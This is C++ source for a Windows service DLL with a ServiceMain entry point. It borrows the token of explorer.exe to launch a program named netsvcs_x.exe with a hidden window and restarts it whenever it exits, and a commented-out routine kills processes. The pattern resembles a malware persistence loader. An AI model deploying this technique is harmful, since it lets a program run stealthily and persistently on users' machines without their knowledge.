// DLL.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"

#include <stdlib.h>
#include <windows.h>
#include <shellapi.h>
#include <iostream> 

#include "tlhelp32.h"

#pragma comment(lib, "Wtsapi32.lib")
using namespace std; 

//DWORD g_dwServiceType;
char	svcname[MAX_PATH];
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;
int i=0;

//==================================================

HANDLE GetProcessHandle(int ID)
{
	return OpenProcess(PROCESS_ALL_ACCESS, FALSE, ID);
}
 
BOOL GetTokenByName(HANDLE &hToken, LPSTR lpName)
{
	if (!lpName)
	{
		return FALSE;
	}
 
	HANDLE	hProcessSnap = NULL;
	BOOL	bRet = FALSE;
	PROCESSENTRY32 pe32 = { 0 };
	HANDLE hProcess = NULL;
 
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
 
	pe32.dwSize = sizeof(PROCESSENTRY32);
 
	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			if (!strcmp(_strupr((char*)pe32.szExeFile), _strupr(lpName)))
			{
				hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
				bRet = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
				CloseHandle(hProcess);
				CloseHandle(hProcessSnap);
				return (bRet);
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
 
	CloseHandle(hProcessSnap);
	return (bRet);
}
 
PROCESS_INFORMATION StartProcess(LPCSTR lpProcName)
{
	STARTUPINFO         stStartup;
	PROCESS_INFORMATION stProcInfo;

	std::string CurSubProcessDir(lpProcName);
 
	CurSubProcessDir = CurSubProcessDir.substr(0, CurSubProcessDir.rfind('\\'));
 
	if (!lpProcName)
	{
		ZeroMemory(&stProcInfo, sizeof(PROCESS_INFORMATION));
		return stProcInfo;
	}
 
	HANDLE hToken = NULL;
	if (!GetTokenByName(hToken, "EXPLORER.EXE"))
	{
		ZeroMemory(&stProcInfo, sizeof(PROCESS_INFORMATION));
		return stProcInfo;
	}
 

 
	ZeroMemory(&stStartup, sizeof(STARTUPINFO));
	stStartup.cb = sizeof(STARTUPINFO);
	stStartup.lpDesktop = TEXT("winsta0\\default");
	stStartup.dwFlags |= STARTF_USESHOWWINDOW;
	stStartup.wShowWindow = SW_HIDE; //SW_SHOWNORMAL;
 
	BOOL bResult = CreateProcessAsUser(hToken, lpProcName, NULL, NULL, NULL,
		FALSE, NORMAL_PRIORITY_CLASS, NULL, CurSubProcessDir.c_str(), &stStartup, &stProcInfo);
 
	CloseHandle(hToken);
 
	if (!bResult)
	{
		char info[80];
		sprintf(info, "CreateProcess failed. error code = %d", GetLastError());
		ZeroMemory(&stProcInfo, sizeof(PROCESS_INFORMATION));
		return stProcInfo;
	}
 
	return stProcInfo;
}
 /*
int KillProgram(LPCSTR lpProcName)
{
	const char    *strFile = NULL;
	HANDLE         hProcessSnap = NULL;
	PROCESSENTRY32 stProcEntry32 = { 0 };
 
	if (!lpProcName || !lpProcName[0])
	{
		return 1; // 参数错误
	}
 
	strFile = strrchr((const char*)lpProcName, '\\');
	if (0 != strFile)
	{
		lpProcName = strFile + 1;
	}
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == (HANDLE)-1)
	{
		return 3;  // 调用失败
	}
 
	//用来给stProcEntry32空间赋值0
	memset(&stProcEntry32, 0, sizeof(stProcEntry32));
	stProcEntry32.dwSize = sizeof(PROCESSENTRY32);
 
	if (Process32First(hProcessSnap, &stProcEntry32))
	{
		do
		{
			if (_strcmpi(stProcEntry32.szExeFile, lpProcName) == 0 ||
				_strcmpi(stProcEntry32.szExeFile, "WerFault.exe") == 0)  //Windows 操作系统将错误处理从崩溃进程的上下文移至新服务，即 Windows 错误报告(WER)
			{
				HANDLE hTerminate = GetProcessHandle(stProcEntry32.th32ProcessID);
				
				TerminateProcess(hTerminate, 999);
				CloseHandle(hTerminate);
				Sleep(10);
			}
		} while (Process32Next(hProcessSnap, &stProcEntry32));
	}
	CloseHandle(hProcessSnap);
 
	return 0; 
}*/



//==================================================

DWORD WINAPI main()
{
	PROCESS_INFORMATION pi;

	
	do{ 
		// 创建子进程，判断是否执行成功 

		pi=StartProcess("C:\\Windows\\SysWOW64\\netsvcs_x.exe");
		//进程执行成功，打印进程信息 

		WaitForSingleObject( pi.hProcess, INFINITE);//检测进程是否停止 

		CloseHandle(pi.hProcess); 
		CloseHandle(pi.hThread); 

	}while(true);//如果进程推出就再次执行方法 




/*	if(i==0)
	{
		i++;
		// ShellExecuteA(NULL, "open", "D:\\testdll2.exe", NULL, NULL, SW_SHOW);
		StartProcess("D:\\testdll2.exe");
		
	}*/
	
	return 0;
}


BOOL APIENTRY DllMain( HANDLE hModule, 
					  DWORD  ul_reason_for_call, 
					  LPVOID lpReserved
					  )
{
    return TRUE;
}

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwCurrentState = g_dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 1000;
    return SetServiceStatus( hServiceStatus, &srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
    // not really necessary because the service stops quickly
    switch( dwControl )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        Sleep(10);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( g_dwCurrState, 0, 0 );
        break;
    }
}


extern "C" __declspec(dllexport) void ServiceMain( int argc, wchar_t* argv[] )
{
	strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
    wcstombs(svcname, argv[0], sizeof svcname);
    hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
    if( hServiceStatus == NULL )
    {
        return;
    }else FreeConsole();
	
    TellSCM( SERVICE_START_PENDING, 0, 1 );
    TellSCM( SERVICE_RUNNING, 0, 0);
    // call Real Service function noew
	
	//g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	do{
		Sleep(100);//not quit until receive stop command, otherwise the service will stop
	}while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	

    return;
}